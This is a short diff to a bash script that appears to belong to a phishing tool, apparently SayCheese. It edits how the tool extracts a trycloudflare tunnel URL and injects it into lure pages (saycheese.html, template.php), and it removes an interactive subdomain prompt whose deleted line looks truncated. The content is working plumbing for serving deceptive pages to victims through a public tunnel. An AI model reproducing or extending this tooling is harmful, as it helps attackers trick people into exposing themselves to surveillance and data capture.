@@ -214,7 +214,7 @@ fi
 
 payload() {
 
-send_link=$(grep -o 'https://[a-zA-Z0-9./?=_%:-]*\.trycloudflare.com' "${PWD}/cloudflare-log" sendlink)
+send_link=$(grep -o 'https://[a-zA-Z0-9./?=_%:-]*\.trycloudflare.com' sendlink)
 
 sed 's+forwarding_link+'$send_link'+g' saycheese.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
@@ -234,7 +234,6 @@ default_subdomain="saycheese$RANDOM"
 choose_sub="y"
 if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
 subdomain_resp=true
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m'  $
 
 subdomain="n"
 fi
